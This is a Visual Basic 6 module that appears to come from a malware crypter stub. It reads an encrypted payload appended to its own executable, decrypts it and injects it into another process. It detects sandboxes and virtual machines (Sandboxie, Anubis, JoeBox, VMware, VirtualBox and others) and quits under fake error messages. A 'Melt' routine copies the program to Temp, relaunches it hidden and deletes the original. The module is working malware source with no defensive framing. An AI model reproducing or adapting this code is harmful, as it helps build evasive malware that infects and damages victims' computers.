Attribute VB_Name = "mKillProcess"
Sub TimerProc(ByVal hwnd As Long, ByVal nIDEvent As Long, ByVal uElapse As Long, ByVal lpTimerFunc As Long)
    KillTimer hwnd, nIDEvent

    Dim sPath   As String
    Dim bSig    As Byte
    Dim lSize   As Long
    Dim cCrypt  As New clsCrypt
    Dim sData   As String
    Dim sSize   As String * 8
    Dim systempath As String
    Dim EOFData() As Byte
        
    If Not m_bCancel Then
        m_bCancel = True
        sPath = ThisExe


        Open sPath For Binary Access Read As #1
          
        Seek #1, LOF(1) - (LengteVanBestand + 1): Get #1, , bSig
        Seek #1, LOF(1) - 9: Get #1, , sSize
        lSize = LengteOrig
        If bSig = 27 And lSize > 0 And lSize < LOF(1) Then
            Seek #1, LOF(1) - (LengteVanBestand + 9) - lSize
            sData = Space(lSize)
            Get #1, , sData
            sData = cCrypt.DecryptString(sData, EncryptionKey)
            mPEL.InjectExe InjectionPath, StrConv(sData, vbFromUnicode)
        End If
    
        Close #1
    End If

End Sub

Private Function ReadSettings()
Dim DATA_SPLIT() As String
Dim DATA_PARAMS() As String
Dim GRAB_DATA As String

Open GetAppFilename For Binary As #1
GRAB_DATA = String(LOF(1), vbNullChar)
Get #1, , GRAB_DATA
Close #1
DATA_SPLIT() = Split(GRAB_DATA, DATA_START)
DATA_PARAMS = Split(DATA_SPLIT(1), DATA_ARRAY)
AntiSandBoxie = DATA_PARAMS(0)
AntiAnubis = DATA_PARAMS(1)
AntiThreatExpert = DATA_PARAMS(2)
AntiCWSandBox = DATA_PARAMS(3)
AntiJoeBox = DATA_PARAMS(4)
AntiVMware = DATA_PARAMS(5)
AntiVirtualPC = DATA_PARAMS(6)
AntiVirtualBox = DATA_PARAMS(7)
EncryptionKey = DATA_PARAMS(8)
LengteVanBestand = DATA_PARAMS(9)
DelayInSecs = DATA_PARAMS(10)
LengteOrig = DATA_PARAMS(11)
MsgOptions = DATA_PARAMS(12)
MsgMessage = DATA_PARAMS(13)
MsgCaption = DATA_PARAMS(14)
InjectionPath = DATA_PARAMS(15)
MeltStub = DATA_PARAMS(16)
DropAs = DATA_PARAMS(17)
ProcToKill = DATA_PARAMS(18)
End Function

Private Function SetVariables()
    AntiAnubis = 1
    AntiJoeBox = 1
    AntiSandBoxie = 1
    AntiCWSandBox = 1
    AntiThreatExpert = 1
    AntiVMware = 1
    AntiVirtualPC = 1
    AntiVirtualBox = 1
    LengteOrig = 1
    EncryptionKey = 1
    LengteVanBestand = 1
    DelayInSecs = 0
    IsInSandboxes = 0
    InjectionPath = 0
    MeltStub = 0
    DropAs = "673353.tmp"
    ProcToKill = ""
    End Function

Private Function CheckAntis()
Call IsInSandbox
Call IsVirtualPCPresent
End Function

Public Function Tegen()

If AntiSandBoxie = 1 And IsInSandboxes = 1 Then
    MsgBox "This program cannot be run in Sandboxie. Please close Sandboxie first.", vbCritical, "Sandboxie"
    End
Else

End If

If AntiThreatExpert = 1 And IsInSandboxes = 2 Then
    MsgBox "This program cannot be run in Threat Expert. Please close Threat Expert first.", vbCritical, "Threat Expert"
    End
Else

End If

If AntiAnubis = 1 And IsInSandboxes = 3 Then
    MsgBox "This program cannot be run in Anubis. Please close Anubis first.", vbCritical, "Anubis"
    End
Else

End If

If AntiCWSandBox = 1 And IsInSandboxes = 4 Then
    MsgBox "This program cannot be run in CWSandbox. Please close CWSandbox first.", vbCritical, "CWSandbox"
    End
Else

End If

If AntiJoeBox = 1 And IsInSandboxes = 5 Then
    MsgBox "This program cannot be run in JoeBox. Please close JoeBox first.", vbCritical, "JoeBox"
    End
Else

End If

If AntiVMware = 1 And IsVirtualPCPresent = 1 Then
    MsgBox "This program cannot be run in VMware Workstation. Please close VMware Workstation first.", vbCritical, "VMware Workstation"
    End
Else

End If


If AntiVirtualPC = 1 And IsVirtualPCPresent = 2 Then
    MsgBox "This program cannot be run in VirtualPC. Please close VirtualPC first.", vbCritical, "VirtualPC"
    End
Else

End If


If AntiVirtualBox = 1 And IsVirtualPCPresent = 3 Then
    MsgBox "This program cannot be run in VirtualBox. Please close VirtualBox first.", vbCritical, "VirtualBox"
    End
Else

End If

End Function

Function GetAppFilename() As String
    Dim hModule As Long
    Dim buffer As String * 256
    
    ' get the handle of the running application
    hModule = GetModuleHandle(App.EXEName)
    ' get the filename corresponding to that handle
    GetModuleFileName hModule, buffer, Len(buffer)
    GetAppFilename = Left$(buffer, InStr(buffer & vbNullChar, vbNullChar) - 1)
End Function

Public Function GetBrowser() As String
   Dim flag As Long
   GetBrowser = GetBrowserName(flag)
End Function

Private Function GetBrowserName(dwFlagReturned As Long) As String
   Dim hFile As Long
   Dim sResult As String
   Dim sTempFolder As String
   sTempFolder = GetTempDir()
   hFile = FreeFile
      Open sTempFolder & "dummy.html" For Output As #hFile
   Close #hFile
   sResult = Space$(MAX_PATH)
   dwFlagReturned = FindExecutable("dummy.html", sTempFolder, sResult)
   Kill sTempFolder & "dummy.html"
   GetBrowserName = TrimNull(sResult)

End Function

Private Function TrimNull(item As String)

    Dim pos As Integer

    pos = InStr(item, Chr$(0))

    If pos Then
       TrimNull = Left$(item, pos - 1)
    Else
       TrimNull = item
    End If

End Function

Public Function GetTempDir() As String

    Dim nSize As Long
    Dim tmp As String

    tmp = Space$(MAX_PATH)
    nSize = Len(tmp)
    Call GetTempPath(nSize, tmp)

    GetTempDir = TrimNull(tmp)

End Function

Public Function Melt()
Dim sYourCommand As String

If App.Path <> Environ("Temp") Then
FileCopy GetAppFilename, Environ("Temp") & "\" & DropAs
Apploc = GetAppFilename
Shell "cmd /k " & Environ("Temp") & "\" & DropAs & " " & Apploc, vbHide
End
End If

If App.Path = Environ("Temp") Then
If Command$ <> "" Then
Apploc = Command$
KillProcess "cmd.exe"
sYourCommand = "Del " & Chr(34) & Apploc & Chr(34)
Shell "cmd /c " & sYourCommand, vbHide
End If
End If
End Function

Private Function GetWinDir()
          WinPath = String(145, Chr(0))
          WinPath = Left(WinPath, GetWindowsDirectory(WinPath, _
          Len(WinPath)))
          systempath = String(145, Chr(0))
          systempath = Left(systempath, GetSystemDirectory(systempath, _
          Len(systempath)))
End Function



